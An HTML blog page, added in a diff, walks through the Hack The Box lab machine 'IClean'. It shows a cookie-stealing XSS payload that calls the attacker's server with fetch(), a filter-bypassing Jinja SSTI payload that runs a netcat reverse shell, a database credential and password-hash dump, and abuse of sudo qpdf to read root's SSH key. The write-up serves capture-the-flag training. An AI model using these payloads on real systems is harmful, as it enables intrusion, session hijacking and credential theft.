@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HTB IClean Guide</title>
+  <link rel="stylesheet" href="/static/css/styles.css"/>
+</head>
+<body>
+  <div class="container">
+    <header class="post-header">
+      <h1>HTB IClean Guide</h1>
+      <div class="post-meta">
+        <span class="date">2024-05-10</span> —
+        <span class="tags"><span class="tag">HTB</span><span class="tag">XSS</span><span class="tag">SSTI</span></span>
+      </div>
+      <img class="post-banner" src="/static/images/htb_iclean_guide_banner.png" alt="Imagem do post"/>
+    </header>
+    <article class="post-body">
+      <p>Iclean is a Hack The Box machine that involves exploring a XSS and SSTI vulnerabilities on a flask application, once we get a shell on the machine we need to do a little lateral movement to change to another user account and then get to privilege escalation using qpdf with sudo.</p>
+<h2>Info</h2>
+<p>The information provided on this site is intended for educational purposes only. While we strive to offer accurate and up-to-date content regarding hacking and security, we cannot be held responsible for any misuse or illegal activity conducted with the knowledge gained from this site. Users are solely responsible for their actions and should use this information ethically and within the boundaries of the law.</p>
+<h2>Nmap Scan</h2>
+<p>Lets start with a simple Nmap scan.</p>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ sudo nmap -sV 10.10.11.12 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 13:53 EDT
+Nmap scan report for 10.10.11.12
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds                                                           
+</code></pre>
+<h2>Initial analysis</h2>
+<p>As we saw with the Nmap scan, the machine is hosting a web server on port 80, so let's give it a look:
+<img alt="iclean_webserver.png" src="/static/images/htb_iclean_guide_1.png"/></p>
+<h2>Web Directory Enumeration</h2>
+<p>One thing that we can do is enumerate some of the directories on the site while we work to find something useful, to do this I will try out <code>dirb</code>:</p>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ dirb http://capiclean.htb
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri May 10 14:06:02 2024
+URL_BASE: http://capiclean.htb/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://capiclean.htb/ ----
++ http://capiclean.htb/about (CODE:200|SIZE:5267)                                                                                                          
++ http://capiclean.htb/dashboard (CODE:302|SIZE:189)                                                                                                       
++ http://capiclean.htb/login (CODE:200|SIZE:2106)                                                                                                          
++ http://capiclean.htb/logout (CODE:302|SIZE:189)                                                                                                          
++ http://capiclean.htb/quote (CODE:200|SIZE:2237)                                                                                                          
++ http://capiclean.htb/server-status (CODE:403|SIZE:278)                                                                                                   
++ http://capiclean.htb/services (CODE:200|SIZE:8592)                                                                                                       
++ http://capiclean.htb/team (CODE:200|SIZE:8109)                                                                                                           
+
+-----------------
+END_TIME: Fri May 10 14:19:27 2024
+DOWNLOADED: 4612 - FOUND: 8
+</code></pre>
+<h2>Initial Analysis</h2>
+<p>Checking the pages we can find two interesting things, first the page <code>dashboard</code> redirect us automatically send us to the home page (as we can see on the HTTP 302 Code), that means we probably can access this page with some kind of right permissions like a cookie. The other page that looks promising is the <code>quote</code> page, there we can find an input field, we can try some things with that:
+<img alt="iclean_quote_page.png" src="/static/images/htb_iclean_guide_2.png"/>
+To better fuzz with that page we can intercept the requests with <code>BurpSuite</code>, that way we can also see the raw request. We can see on the request that we have 2 parameters where we can fuzz <code>email</code> and <code>service</code>:
+<img alt="Iclean_Burp1.png" src="/static/images/htb_iclean_guide_3.png"/>
+We can try to catch some SQL Injection on those parameter but nothing seams to work. Another thing we can try is XSS. To try and see if we can use XSS let's forward that request and see the response on the browser:
+<img alt="Iclean_site2.png" src="/static/images/htb_iclean_guide_4.png"/>
+We can see that the page doesn't have any kind of reflection for the service or email, so we will need to try some XSS that doesn't use reflection, that means that the standard <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> is not going to work. We can use a XSS payload like that: <code>&lt;img src=x onerror=fetch("http://IP:PORT/it-works");&gt;</code></p>
+<p>That XSS will try to insert an image that will certainly provoke an error, since we provided an invalid <code>src</code>, than we will use the <code>fetch</code> function from JavaScript to <code>fetch</code> a file from your web server, that way if that is executed we will see a request. Before we send this to <code>Burbsuite</code> we need to set up a web server, we can use python for that:</p>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ python3 -m http.server 8081
+Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+</code></pre>
+<p>Now we can configure your Burp to send that payload, it is important that we URL encode all key characters, we can do that selecting the text that we want to encode, than click with right mouse button, <strong>Convert Selection(1)</strong> → <strong>URL(2)</strong> → <strong>URL-encode key characters(3)</strong>
+<img alt="Iclean_Burp2.png" src="/static/images/htb_iclean_guide_5.png"/>
+Once we forward that request we can see the request on your python web server:</p>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ python3 -m http.server 8081
+Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+10.10.11.12 - - [11/May/2024 09:14:48] code 404, message File not found
+10.10.11.12 - - [11/May/2024 09:14:48] "GET /it-works HTTP/1.1" 404 -
+</code></pre>
+<p><strong>Note</strong>: The GET request may take a while to show up.</p>
+<p>So the parameter <code>service</code> is vulnerable to XSS, but there is an important aspect of this XSS that we need to notice, this fetch that we just did was not executed by your browser. Normally a XSS will be reflected and executed by the client, in that case we would have a Client XSS, but in this case we have a server XSS. So we can use that to gather some information from the server, in that case we can get for example the cookies that we need to access the dashboard. To do that, we can make a small modification on the previous payload that we used: <code>&lt;img src=x onerror=fetch("http://IP:PORT/"+document.cookie);&gt;</code>, that will grab the cookies:</p>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ python3 -m http.server 8081
+Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+10.10.11.12 - - [11/May/2024 09:41:48] code 404, message File not found
+10.10.11.12 - - [11/May/2024 09:41:48] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zj9XFw.y6U6qnQFuUOzPPAscFR7-Eyq2Tk HTTP/1.1" 404 -
+</code></pre>
+<p>Now we can add this cookie to our browser and try to access any page that we got an HTTP code 302( in this case <code>dashboard</code>), to add this cookie we can user a plugin to edit cookies, or we can add it manually on the browser:
+<img alt="Iclean_cookie_add.png" src="/static/images/htb_iclean_guide_6.png"/>
+To add a cookie manually we can navigate to the storage tab on the debug panel, go to the cookies section and add a new one clicking on the plus sign(1), than add the cookie name(2), in this case is <code>session</code>, than the cookie value(3), in this case is <code>eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zj9XFw.y6U6qnQFuUOzPPAscFR7-Eyq2Tk</code>, and set the path(4) to the root <code>/</code>. That way, we can try to access the page dashboard and see if there is any difference.
+<img alt="Iclean_dashboard.png" src="/static/images/htb_iclean_guide_7.png"/></p>
+<h2>Getting a shell</h2>
+<p>Accessing the dashboard page now we are not redirected to the home page, now we can see the actual dashboard, here we can see 4 different options to further fuzz. But before we continue, there is an important aspect of this application, with the last request we did with Burpsuite, we can see on the header of the HTTP response a <code>Server</code> information:</p>
+<pre><code>HTTP/1.1 200 OK
+Date: Sat, 11 May 2024 13:41:23 GMT
+Server: Werkzeug/2.3.7 Python/3.10.12
+Content-Type: text/html; charset=utf-8
+Vary: Accept-Encoding
+Connection: close
+Content-Length: 5048
+</code></pre>
+<p>That <code>Server: Werkzeug/2.3.7 Python/3.10.12</code>, that shows us that the back end server is using python to run this application, further than that, we can see the <a href="https://werkzeug.palletsprojects.com/en/3.0.x/">Werkzeug</a>, is a WSGI web application library, that is used by <a href="https://flask.palletsprojects.com/en/3.0.x/">Flask</a>, so we can expect the application to use <a href="https://jinja.palletsprojects.com/en/3.1.x/">Jinja</a>.</p>
+<blockquote>
+<p>WSGI is the Web Server Gateway Interface. It is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request.
+https://wsgi.readthedocs.io/en/latest/what.html</p>
+</blockquote>
+<p><img alt="Iclean_generate_invoice.png" src="/static/images/htb_iclean_guide_8.png"/>
+Once we click on Generate, we can see an invoice id was generated, I tried to fuzz with the inputs on that page but without any kind of interesting result. So let's try to use the invoice id to access other functionalities.
+<img alt="Pasted image 20240511131521.png" src="/static/images/htb_iclean_guide_9.png"/>
+Now let's move forward with that to the page Generate QR, there we need to input our invoice id, then a QR code link will be generated, then we need to add this QR code link on the input down below. Once we click on submit a new page will open with information about the invoice:
+<img alt="Iclean_qrcode.png" src="/static/images/htb_iclean_guide_10.png"/>
+Capturing the request with <code>Burpsuite</code> again we can see that the <code>qr_link</code> POST parameter is vulnerable to <strong>SSTI</strong> (Server Side Template Injection):
+<img alt="Iclean_SSTI_1.png" src="/static/images/htb_iclean_guide_11.png"/>
+On (1) we inserted some python code on a template formatting for Jinja, using the <code>{{ *code here* }}</code>, on (2) we can see that the python executed our command, creating a string with 5 consecutive <code>'test'</code>. Now we could just use a python reverse shell to gain access to the machine. But, the application looks like it has some kind of filters, any simple reverse shell is not going to work, we can use some of the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?source=post_page-----171621c377e7--------------------------------#jinja2---basic-injection">filter bypassing</a> for Jinja.</p>
+<p>One that looks like it works is:</p>
+<pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+</code></pre>
+<p><img alt="Iclean_SSTI_2.png" src="/static/images/htb_iclean_guide_12.png"/>
+Here we can see that the filter bypass(1) worked as intended, outputting the <code>id</code> command. So we can modify that filter bypass to create a reverse shell. So I tried a bunch of reverse shells and the one I got a shell back was this one:</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.183 8002 &gt;/tmp/f
+</code></pre>
+<p>To insert it on the payload, we just need to insert this on the filed that has the <code>id</code>, and we need to URL encode it too:</p>
+<pre><code>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2&gt;%261|nc+10.10.14.183+8002+&gt;/tmp/f')|attr('read')()}}
+</code></pre>
+<p>Before we send it again we need to start a netcat listener, in that case we need to start a listener on port <code>8002</code>. Once we send this payload to the server, we should recieve a reverse shell back:</p>
+<pre><code>┌──(kali㉿atropos)-[~]
+└─$ nc -lvnp 8002
+listening on [any] 8002 ...
+connect to [10.10.14.183] from (UNKNOWN) [10.10.11.12] 34986
+sh: 0: can't access tty; job control turned off
+$ ls
+app.py
+static
+templates
+$ 
+</code></pre>
+<p>One thing I will modify on the payload is the shell, I started the shell with <code>sh</code>, but <code>bash</code> is a little bit more friendly, so to do this we can simply do this payload:</p>
+<pre><code>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2&gt;%261|nc+10.10.14.183+8002+&gt;/tmp/f')|attr('read')()}}
+</code></pre>
+<p>Now we can use python to spawn a full shell:</p>
+<pre><code class="language-bash">python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo;fg
+export TERM=xterm
+</code></pre>
+<p>Now we need a way to find a way to execute commands as root, and start a privilege escalation, but there is a problem, our current user is <code>www-data</code>:</p>
+<pre><code>www-data@iclean:/opt/app$ whoami
+www-data
+www-data@iclean:/opt/app$ 
+</code></pre>
+<p>That means that we can't even get the user flag, that I think is in the <code>consuela</code> folder on <code>/home</code>:</p>
+<pre><code>www-data@iclean:/opt/app$ ls /home
+consuela
+www-data@iclean:/opt/app$ cd /home/consuela
+bash: cd: /home/consuela: Permission denied
+www-data@iclean:/opt/app$ 
+</code></pre>
+<p>One the <code>app.py</code> file we can see some expose password for the database, we can use this to find hashes and use those to get our user flag and possibly our root flag if we get lucky:</p>
+<pre><code>www-data@iclean:/opt/app$ ls
+app.py  static  templates
+www-data@iclean:/opt/app$ cat app.py
+from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
+from flask import render_template_string
+import pymysql
+import hashlib
+import os
+import random, string
+import pyqrcode
+from jinja2 import StrictUndefined
+from io import BytesIO
+import re, requests, base64
+
+app = Flask(__name__)
+
+app.config['SESSION_COOKIE_HTTPONLY'] = False
+
+secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
+app.secret_key = secret_key
+# Database Configuration
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}
+</code></pre>
+<p>Now that we have a user and password for the database we can log in to the <code>mysql</code> and try finding further information:</p>
+<pre><code>ww-data@iclean:/opt/app$ mysql -u 'iclean' -p 
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 5917
+Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| capiclean          |
+| information_schema |
+| performance_schema |
++--------------------+
+3 rows in set (0.01 sec)
+
+mysql&gt; use capiclean;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++---------------------+
+| Tables_in_capiclean |
++---------------------+
+| quote_requests      |
+| services            |
+| users               |
++---------------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; select * from users;
++----+----------+------------------------------------------------------------------+----------------------------------+
+| id | username | password                                                         | role_id                          |
++----+----------+------------------------------------------------------------------+----------------------------------+
+|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
+|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
++----+----------+------------------------------------------------------------------+----------------------------------+
+2 rows in set (0.00 sec)
+</code></pre>
+<p>Now we can start cracking those hashes and see if we can use this on the users on the machine. To do this I will first just simply do a search on those hashes, this is a faster approach than just plug those in to hashcat, luckily we will find a match:
+<img alt="Iclean_hash_search.png" src="/static/images/htb_iclean_guide_13.png"/>
+Here I just used a <a href="https://hashes.com/en/decrypt/hash">site</a> to make a search on those hashes, luckily we found the password for the user consuela. Let's try to change the user on the machine using that password:</p>
+<pre><code>www-data@iclean:/opt/app$ su consuela
+Password: 
+consuela@iclean:/opt/app$ cd /home/consuela/
+consuela@iclean:~$ ls
+user.txt
+consuela@iclean:~$ cat user.txt 
+</code></pre>
+<p>And we got it. Now lets do some Privilege escalation.</p>
+<h2>Privilege Escalation</h2>
+<p>The easy way to check for something we can use on privilege escalation is the <code>sudo -l</code>, since we have the password for the user we can try and see if that user can run anything as sudo:</p>
+<pre><code>consuela@iclean:~$ sudo -l
+[sudo] password for consuela: 
+Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf
+consuela@iclean:~$ 
+</code></pre>
+<p>And yes, we can use <code>qpdf</code> as sudo.</p>
+<blockquote>
+<p>QPDF is a command-line tool and C++ library that performs content-preserving transformations on PDF files. It supports linearization, encryption, and numerous other features. It can also be used for splitting and merging files, creating PDF files (but you have to supply all the content yourself), and inspecting files for study or analysis. QPDF does not render PDFs or perform text extraction, and it does not contain higher-level interfaces for working with page contents. It is a low-level tool for working with the structure of PDF files and can be a valuable tool for anyone who wants to do programmatic or command-line-based manipulation of PDF files.
+https://qpdf.sourceforge.io</p>
+</blockquote>
+<p>So, we can use a program that can interact with text files as sudo, so, we can use this to just grab our root key, since we know the name of the file and the location (since hack the box use this standard locations and names), but we can also grab the RSA keys for the root user and log in to ssh using that key.</p>
+<pre><code>consuela@iclean:~$ sudo qpdf --empty /home/consuela/keys.txt --qdf --add-attachment /root/.ssh/id_rsa --
+consuela@iclean:~$ ls
+keys.txt  user.txt
+consuela@iclean:~$ cat keys.txt 
+%PDF-1.3
+%����
+%QDF-1.0
+
+%% Original object ID: 1 0
+1 0 obj
+&lt;&lt;
+  /Names &lt;&lt;
+    /EmbeddedFiles 2 0 R
+  &gt;&gt;
+  /PageMode /UseAttachments
+  /Pages 3 0 R
+  /Type /Catalog
+&gt;&gt;
+
+&lt;SNIP&gt;
+
+stream
+-----BEGIN OPENSSH PRIVATE KEY-----
+
+&lt;REMOVED&gt;
+
+-----END OPENSSH PRIVATE KEY-----
+endstream
+endobj
+
+&lt;SNIP&gt;
+
+</code></pre>
+<p>Here we can copy that key and save on our machine and use it to log in with ssh, but before we use the key we need to set some permission on the file:</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb/machines/Iclean]
+└─$ chmod g-r,o-r,u-w key
+
+┌──(kali㉿atropos)-[~/htb/machines/Iclean]
+└─$ ls -al 
+total 12
+drwxr-xr-x 2 kali kali 4096 May 11 13:41 .
+drwxr-xr-x 4 kali kali 4096 May 11 13:38 ..
+-r-------- 1 kali kali  505 May 11 13:39 key
+</code></pre>
+<p>Now we can use that key with ssh and login as root, and get our flag:</p>
+<pre><code>┌──(kali㉿atropos)-[~/htb/machines/Iclean]
+└─$ ssh -i key root@10.10.11.12
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Sat May 11 05:41:43 PM UTC 2024
+
+
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+3 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+root@iclean:~# ls
+root.txt  scripts
+root@iclean:~# cat root.txt
+</code></pre>
+    </article>
+  </div>
+</body>
+</html>
